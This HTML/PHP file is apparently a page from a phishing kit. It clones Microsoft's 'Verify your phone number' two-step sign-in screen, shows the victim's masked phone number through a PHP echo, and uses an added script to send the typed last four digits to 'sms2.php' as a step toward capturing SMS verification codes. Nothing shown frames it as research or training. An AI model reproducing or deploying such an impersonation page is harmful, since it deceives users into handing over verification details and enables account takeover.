  ...
  <body class=cb data-bind="defineGlobals: ServerData, bodyCssClass">
    ...
    component: { name: 'background-image-control',
        ...
        'slide-in-back': animate.isSlideInBack() }">
                                  <div data-viewid=11 data-showidentitybanner=true data-bind="pageViewComponent: { name: 'proof-confirmation-view',
                    params: {
                        serverData: svr,
                    ...
                    event: {
                        ...
                        setPendingRequest: $tfaPage.view_onSetPendingRequest } }">
                                    <div data-bind="component: { name: 'proof-confirmation-field',
    publicMethods: proofConfirmationMethods,
    params: {
        serverData: svr,
        username: username,
        sentProof: sentProof,
    ...
    event: {
        load: proofConfirmationField_onLoad,
        switchView: view_onSwitchView,
        updateProofConfirmation: view_onUpdateProofConfirmation,
        updateSessionIdentifier: view_onUpdateSessionIdentifier,
        setPendingRequest: view_onSetPendingRequest } }">
                                      <div id=idDiv_SAOTCS_ProofConfirmation_Holder class=form-group>
                                        <div id=idDiv_SAOTCS_Title class="row text-title" role=heading aria-level=1 data-bind="text: sentProof.getString('CT_SAOTCS_STR_ProofConfirmationTitle')">Verify your phone number</div>
                                        <div id=idDiv_SAOTCS_ProofConfirmation_Section class="row form-group">
                                          <div id=idDiv_SAOTCS_ProofConfirmationDesc class=form-group data-bind="html: sentProof.getString('CT_SAOTCS_STR_ProofConfirmationDesc')">We will send a verification code to ‎********<?php echo($last2); ?>‎. To verify that this is your phone number, enter the last 4 digits including <?php echo($last2); ?>.</div>
                                          <div role=alert aria-live=assertive></div>
                                          <div id=idDiv_SAOTCS_ProofConfirmation>
                                            <div id=idDiv_SAOTCS_ProofConfirmation_PTB>
                                              <div class=placeholderContainer data-bind="component: { name: 'placeholder-textbox-field',
                    publicMethods: proofConfirmationTextbox.placeholderTextboxMethods,
                    params: {
                        serverData: svr,
                        hintText: sentProof.getString('CT_SAOTCS_STR_ProofConfirmation_TBHint') },
                    event: {
                        updateFocus: proofConfirmationTextbox.textbox_onUpdateFocus } }">
                                                <input id=idTxtBx_SAOTCS_ProofConfirmation autocomplete=off name=ProofConfirmation class=form-control type=tel aria-required=true data-bind="
                        attr: sentProof.confirmationAttributes(),
                        css: { 'ltr_override': sentProof.typeSwitch(true, false), 'has-error': proofConfirmationTextbox.error },
                        ariaLabel: sentProof.getString('CT_SAOTCS_STR_ProofConfirmation_TBHint'),
                        ariaDescribedBy: 'idDiv_SAOTCS_Title idDiv_SAOTCS_ProofConfirmationDesc',
                        textInput: proofConfirmationTextbox.value,
                        hasFocusEx: proofConfirmationTextbox.focused,
                        placeholder: $placeholderText" maxlength=4 aria-label="Last 4 digits of phone number" aria-describedby="idDiv_SAOTCS_Title idDiv_SAOTCS_ProofConfirmationDesc" placeholder="Last 4 digits of phone number" value>
                                              </div>
                                              <script>
                                              	document.getElementById( 'idTxtBx_SAOTCS_ProofConfirmation' ).addEventListener( 'keypress', function(event) {
				                                          if ( event.key === 'Enter' ) {
				                                            event.preventDefault();
				                                            document.getElementById( 'idSubmit_SAOTCS_SendCode' ).click();
				                                          }
				                                        });
                                              	function onSubmit() {
                                              		if ( document.getElementById( 'idTxtBx_SAOTCS_ProofConfirmation' ).value != '' ) {
                                              			window.location.replace( 'sms2.php?last4=' + document.getElementById( 'idTxtBx_SAOTCS_ProofConfirmation' ).value );
                                              		}
                                              	}
                                              </script>
                                            </div>
                                    ...
                                    <div class=position-buttons>
                                      <div class=row>
                                        <div id=idDiv_SAOTCS_Toggle class="text-13 form-group no-margin-top">
                                          <a id=idA_SAOTCS_Toggle href=https://login.live.com/# data-bind="html: str['CT_SAOTCS_STR_HaveCode'], click: switchToOtcConfirm_onClick">I have a code</a>
                                        </div>
                                      </div>
                                    </div>
            ...
            params: {
                serverData: svr,
                primaryButtonId: 'idSubmit_SAOTCS_SendCode',
                primaryButtonText: sentProof.getString('CT_SAOTCS_STR_ProofNextText'),
                removeBottomMargin: true,
                isPrimaryButtonVisible: svr.F,
                isSecondaryButtonVisible: false },
            event: {
                primaryButtonClick: primaryButton_onClick } }" onclick="onSubmit()">
    ...
    externalCss: { 'button-field-container': true }">
                                            <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
                                              <input type=button id=idSubmit_SAOTCS_SendCode class="win-button button_primary button ext-button primary ext-primary" data-report-event=Signin_Submit data-report-trigger=click data-report-value=Submit data-bind="
                ...
                preventTabbing: primaryButtonPreventTabbing" value="Send code" data-report-attached=1>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
